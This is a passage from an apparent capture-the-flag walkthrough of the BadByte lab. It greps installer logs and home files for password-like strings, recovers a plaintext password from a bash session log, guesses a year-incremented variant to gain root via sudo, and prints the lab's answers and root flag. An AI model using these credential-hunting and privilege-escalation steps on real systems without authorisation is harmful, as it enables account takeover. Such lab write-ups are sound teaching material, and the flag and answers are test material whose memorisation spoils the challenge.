+/var/log/journal/9e820b66672c461c8943ddaa1847e66f/user-1000@afd24b6bb088440fa43b6c2a1cad9e10-00000000000007a6-0005be24749826ec.journal
+/var/log/dist-upgrade/history.log
+/var/log/dist-upgrade/apt.log
+/var/log/dist-upgrade/main.log
+/var/log/do-release-upgrade.log
+
+
+Search in installer logs for password like strings:
+grep -iE "password|secret|note" /var/log/installer/* 2>/dev/null
+OUTPUT:
+/var/log/installer/installer-journal.txt:Mar 22 22:40:57 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+/var/log/installer/installer-journal.txt:Mar 22 18:02:53 ubuntu-server usermod[14698]: change user 'sshd' password
+/var/log/installer/installer-journal.txt:Mar 22 18:02:53 ubuntu-server chage[14703]: changed password expiry for sshd
+/var/log/installer/subiquity-debug.log:2021-03-22 22:41:25,160 DEBUG subiquity.controllers.refresh:200 check_for_update received {'type': 'sync', 'status-code': 200, 'status': 'OK', 'result': [{'id': 'CSO04Jhav2yK0uz97cr0ipQRyqg0qQL6', 'title': 'Core 18', 'summary': 'Runtime environment based on Ubuntu 18.04', 'description': 'The base snap based on the Ubuntu 18.04 release.', 'download-size': 58159104, 'name': 'core18', 'publisher': {'id': 'canonical', 'username': 'canonical', 'display-name': 'Canonical', 'validation': 'verified'}, 'developer': 'canonical', 'status': 'available', 'type': 'base', 'version': '20210128', 'channel': 'latest/stable', 'ignore-validation': False, 'revision': '1988', 'confinement': 'strict', 'private': False, 'devmode': False, 'jailmode': False, 'contact': '', 'license': 'Other Open Source'}, {'id': 'PMrrV4ml8uWuEUDBT8dSGnKUYbevVhc4', 'title': 'snapd', 'summary': 'Background service that manages and maintains installed snaps', 'description': "**Note: you do not need to install _snapd_ manually if you already have _snap_ installed.**\n\nSnaps are app packages for desktop, cloud and IoT that update automatically, are easy to install, secure, cross-platform and dependency-free. They're being used on millions of Linux systems every day.\n\nAlongside its various service and management functions, snapd:\n- provides the _snap_ command that's used to install and remove snaps and interact with the wider snap ecosystem\n- implements the confinement policies that isolate snaps from the base system and from each other\n- governs the interfaces that allow snaps to access specific system resources outside of their confinement\n\nFor general details, including _installation_ and _Getting started_  guides, head over to our _Snap documentation_: https://snapcraft.io/docs\n\nIf you want to build your own snaps, start with our _Creating a snap_ documentation: https://snapcraft.io/docs/creating-a-snap\n\n**Get involved**\n\nThis is an _open source_ project and we warmly welcome community contributions, suggestions, and constructive feedback. If you're interested in contributing, please take a look at our _Code of Conduct_ first.\n\n- to report an issue, please file _a bug report_ (https://bugs.launchpad.net/snappy/+filebug) on our _Launchpad issue tracker_ (https://bugs.launchpad.net/snappy/)\n- for suggestions and constructive feedback, create a post on the _Snapcraft forum_ (https://forum.snapcraft.io/c/snapd)\n- to build snapd manually, or to get started with snapd development, see  _HACKING.md (https://raw.githubusercontent.com/snapcore/snapd/master/HACKING.md)\n\n**Get in touch**\n\nWe're friendly! We have a community forum at https://forum.snapcraft.io where we discuss feature plans, development news, issues, updates and troubleshooting. You can chat in realtime with the snapd team and our wider community on the _#snappy_ (https://webchat.freenode.net/?channels=snappy) IRC channel on _freenode_ (https://freenode.net/).\n\nFor news and updates, follow us on _Twitter_ (https://twitter.com/snapcraftio) and on _Facebook_ (https://www.facebook.com/snapcraftio).\n\nThe snapd source code can be found on GitHub: https://github.com/snapcore/snapd", 'download-size': 33845248, 'icon': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/snapd.png', 'name': 'snapd', 'publisher': {'id': 'canonical', 'username': 'canonical', 'display-name': 'Canonical', 'validation': 'verified'}, 'developer': 'canonical', 'status': 'available', 'type': 'snapd', 'version': '2.49', 'channel': 'latest/stable', 'ignore-validation': False, 'revision': '11107', 'confinement': 'strict', 'private': False, 'devmode': False, 'jailmode': False, 'contact': '', 'license': 'GPL-3.0+', 'website': 'https://snapcraft.io', 'media': [{'type': 'icon', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/snapd.png', 'width': 460, 'height': 460}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_115756_hLcyetO.png', 'width': 956, 'height': 648}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_115824_2v3y6l8.png', 'width': 956, 'height': 648}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_115055_Uuq7KIb.png', 'width': 1023, 'height': 834}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_125944.png', 'width': 956, 'height': 648}]}, {'id': 'ba2aj8guta0zSRlT3QM5aJNAUXPlBtf9', 'title': 'subiquity', 'summary': 'Ubuntu installer', 'description': 'The Ubuntu server installer', 'download-size': 55234560, 'name': 'subiquity', 'publisher': {'id': 'canonical', 'username': 'canonical', 'display-name': 'Canonical', 'validation': 'verified'}, 'developer': 'canonical', 'status': 'available', 'type': 'app', 'base': 'core18', 'version': '21.01.2', 'channel': 'latest/stable', 'ignore-validation': False, 'revision': '2280', 'confinement': 'classic', 'private': False, 'devmode': False, 'jailmode': False, 'contact': 'https://bugs.launchpad.net/subiquity', 'license': 'AGPL-3.0'}]}
+/var/log/installer/subiquity-debug.log:2021-03-22 17:43:26,736 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'badbyte', 'realname': 'cth', 'username': 'cth', 'password': '<REDACTED>'}
+/var/log/installer/subiquity-debug.log.1996:2021-03-22 22:41:25,160 DEBUG subiquity.controllers.refresh:200 check_for_update received {'type': 'sync', 'status-code': 200, 'status': 'OK', 'result': [{'id': 'CSO04Jhav2yK0uz97cr0ipQRyqg0qQL6', 'title': 'Core 18', 'summary': 'Runtime environment based on Ubuntu 18.04', 'description': 'The base snap based on the Ubuntu 18.04 release.', 'download-size': 58159104, 'name': 'core18', 'publisher': {'id': 'canonical', 'username': 'canonical', 'display-name': 'Canonical', 'validation': 'verified'}, 'developer': 'canonical', 'status': 'available', 'type': 'base', 'version': '20210128', 'channel': 'latest/stable', 'ignore-validation': False, 'revision': '1988', 'confinement': 'strict', 'private': False, 'devmode': False, 'jailmode': False, 'contact': '', 'license': 'Other Open Source'}, {'id': 'PMrrV4ml8uWuEUDBT8dSGnKUYbevVhc4', 'title': 'snapd', 'summary': 'Background service that manages and maintains installed snaps', 'description': "**Note: you do not need to install _snapd_ manually if you already have _snap_ installed.**\n\nSnaps are app packages for desktop, cloud and IoT that update automatically, are easy to install, secure, cross-platform and dependency-free. They're being used on millions of Linux systems every day.\n\nAlongside its various service and management functions, snapd:\n- provides the _snap_ command that's used to install and remove snaps and interact with the wider snap ecosystem\n- implements the confinement policies that isolate snaps from the base system and from each other\n- governs the interfaces that allow snaps to access specific system resources outside of their confinement\n\nFor general details, including _installation_ and _Getting started_  guides, head over to our _Snap documentation_: https://snapcraft.io/docs\n\nIf you want to build your own snaps, start with our _Creating a snap_ documentation: https://snapcraft.io/docs/creating-a-snap\n\n**Get involved**\n\nThis is an _open source_ project and we warmly welcome community contributions, suggestions, and constructive feedback. If you're interested in contributing, please take a look at our _Code of Conduct_ first.\n\n- to report an issue, please file _a bug report_ (https://bugs.launchpad.net/snappy/+filebug) on our _Launchpad issue tracker_ (https://bugs.launchpad.net/snappy/)\n- for suggestions and constructive feedback, create a post on the _Snapcraft forum_ (https://forum.snapcraft.io/c/snapd)\n- to build snapd manually, or to get started with snapd development, see  _HACKING.md (https://raw.githubusercontent.com/snapcore/snapd/master/HACKING.md)\n\n**Get in touch**\n\nWe're friendly! We have a community forum at https://forum.snapcraft.io where we discuss feature plans, development news, issues, updates and troubleshooting. You can chat in realtime with the snapd team and our wider community on the _#snappy_ (https://webchat.freenode.net/?channels=snappy) IRC channel on _freenode_ (https://freenode.net/).\n\nFor news and updates, follow us on _Twitter_ (https://twitter.com/snapcraftio) and on _Facebook_ (https://www.facebook.com/snapcraftio).\n\nThe snapd source code can be found on GitHub: https://github.com/snapcore/snapd", 'download-size': 33845248, 'icon': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/snapd.png', 'name': 'snapd', 'publisher': {'id': 'canonical', 'username': 'canonical', 'display-name': 'Canonical', 'validation': 'verified'}, 'developer': 'canonical', 'status': 'available', 'type': 'snapd', 'version': '2.49', 'channel': 'latest/stable', 'ignore-validation': False, 'revision': '11107', 'confinement': 'strict', 'private': False, 'devmode': False, 'jailmode': False, 'contact': '', 'license': 'GPL-3.0+', 'website': 'https://snapcraft.io', 'media': [{'type': 'icon', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/snapd.png', 'width': 460, 'height': 460}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_115756_hLcyetO.png', 'width': 956, 'height': 648}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_115824_2v3y6l8.png', 'width': 956, 'height': 648}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_115055_Uuq7KIb.png', 'width': 1023, 'height': 834}, {'type': 'screenshot', 'url': 'https://dashboard.snapcraft.io/site_media/appmedia/2019/09/Screenshot_20190924_125944.png', 'width': 956, 'height': 648}]}, {'id': 'ba2aj8guta0zSRlT3QM5aJNAUXPlBtf9', 'title': 'subiquity', 'summary': 'Ubuntu installer', 'description': 'The Ubuntu server installer', 'download-size': 55234560, 'name': 'subiquity', 'publisher': {'id': 'canonical', 'username': 'canonical', 'display-name': 'Canonical', 'validation': 'verified'}, 'developer': 'canonical', 'status': 'available', 'type': 'app', 'base': 'core18', 'version': '21.01.2', 'channel': 'latest/stable', 'ignore-validation': False, 'revision': '2280', 'confinement': 'classic', 'private': False, 'devmode': False, 'jailmode': False, 'contact': 'https://bugs.launchpad.net/subiquity', 'license': 'AGPL-3.0'}]}
+/var/log/installer/subiquity-debug.log.1996:2021-03-22 17:43:26,736 DEBUG subiquity.controllers.identity:73 IdentityController.done next_screen user_spec={'hostname': 'badbyte', 'realname': 'cth', 'username': 'cth', 'password': '<REDACTED>'
+Note:
+Found interesting line in subiquity-debug.log: 
+user_spec={'hostname': 'badbyte', 'realname': 'cth', 'username': 'cth', 'password': '<REDACTED>'}
+'password': '<REDACTED>' means the password was stored, but can't be displayed for security reasons.
+
+
+Check files in installer directory:
+ls /var/log/installer/
+OUTPUT:
+autoinstall-user-data    subiquity-curtin-install.conf
+block                    subiquity-debug.log
+curtin-install-cfg.yaml  subiquity-debug.log.1996
+curtin-install.log       subiquity-info.log
+installer-journal.txt    subiquity-info.log.1996
+media-info
+Note:
+We already checked subiquity-debug.log and subiquity-debug.log.1996.
+
+
+Read autoinstaller:
+cat /var/log/installer/autoinstall-user-data
+OUTPUT:
+cat: /var/log/installer/autoinstall-user-data: Permission denied
+
+
+List cth's home directory:
+ls -la /home/cth
+OUTPUT: 
+total 36
+drwxr-xr-x 4 cth  cth  4096 Mar 23  2021 .
+drwxr-xr-x 5 root root 4096 Jul 20 06:17 ..
+lrwxrwxrwx 1 cth  cth     9 Mar 23  2021 .bash_history -> /dev/null
+-rw-r--r-- 1 cth  cth   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 cth  cth  3771 Apr  4  2018 .bashrc
+drwx------ 2 cth  cth  4096 Mar 23  2021 .cache
+drwx------ 3 cth  cth  4096 Mar 23  2021 .gnupg
+-rw-r--r-- 1 cth  cth   807 Apr  4  2018 .profile
+-rw-r--r-- 1 cth  cth     0 Mar 23  2021 .sudo_as_admin_successful
+-rw------- 1 cth  cth   739 Mar 23  2021 .viminfo
+-rw-rw-r-- 1 cth  cth    38 Mar 23  2021 user.txt
+
+
+Try to find ssh files in his home directory:
+ls -la /home/cth/.ssh
+OUTPUT:
+ls: cannot access '/home/cth/.ssh': No such file or directory
+
+
+Try read bash history:
+~/.bash_history
+Note:
+No output.
+
+
+Try to find passwordlike patterns:
+find . -type f -readable -exec strings {} \; 2>/dev/null | grep -P '^[A-Za-z0-9@#$%^&*!+=]{8,}$' | sort -u
+Note:
+No output.
+
+
+Read bash log:
+cat /var/log/bash.log:
+Script started on 2021-03-23 21:05:06+0000
+cth@badbyte:~$ whoami
+cth
+cth@badbyte:~$ date
+Tue 23 Mar 21:05:14 UTC 2021
+cth@badbyte:~$ suod su
+
+Command 'suod' not found, did you mean:
+
+  command 'sudo' from deb sudo
+  command 'sudo' from deb sudo-ldap
+
+Try: sudo apt install <deb name>
+
+cth@badbyte:~$ G00dP@$sw0rd2020
+G00dP@: command not found
+cth@badbyte:~$ passwd
+Changing password for cth.
+(current) UNIX password: 
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+cth@badbyte:~$ ls
+cth@badbyte:~$ cowsay "vim >>>>>>>>>>>>>>>>> nano"
+ ____________________________
+< vim >>>>>>>>>>>>>>>>> nano >
+ ----------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+cth@badbyte:~$ cowsay " g = pi ^ 2 " 
+ ______________
+<  g = pi ^ 2  >
+ --------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+cth@badbyte:~$ cowsay "mooooooooooooooooooo"
+ ______________________
+< mooooooooooooooooooo >
+ ----------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+cth@badbyte:~$ exit
+
+Script done on 2021-03-23 21:07:03+0000
+Note:
+We found a password like string: G00dP@$sw0rd2020. Also, he types it after trying to run sudo su.
+Answer:
+G00dP@$sw0rd2020
+
+
+
+6.2. WHAT IS THE ROOT FLAG?
+Note:
+Following the clue that his new password is slightly change, we manually try more recent years until now. Then we might consider complex tools.
+Trying G00dP@$sw0rd2021:
+sudo su
+OUTPUT:
+/#
+Note:
+We got root.
+
+
+Check root flag:
+cat /root/root.txt
+OUTPUT:
+  |      ______    ________   ________              ______        _____________ __________  |
+  |     / ____ \  /  ___   \ /   ____ \            / ____ \      /____    ____//   ______/\ |
+  |    / /___/_/ /  /__/   //   /   / /\          / /___/_/      \___/   /\___/   /______\/ |
+  |   / _____ \ /  ____   //   /   / / /         / _____ \ __   ___ /   / /  /   ____/\     |
+  |  / /____/ //  / __/  //   /___/ / /         / /____/ //  | /  //   / /  /   /____\/     |
+  | /________//__/ / /__//_________/ /         /________/ |  \/  //___/ /  /   /________    |
+  | \________\\__\/  \__\\_________\/          \________\  \    / \___\/  /____________/\   | 
+  |                                  _________           __/   / /        \____________\/   |
+  |                                 /________/\         /_____/ /                           |
+  |                                 \________\/         \_____\/                            |
+
+THM{ad485b44f63393b6a9225974909da5fa}
+
+ ________________________
+< Made with ❤ by BadByte >
+ ------------------------
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+Answer:
+THM{ad485b44f63393b6a9225974909da5fa}
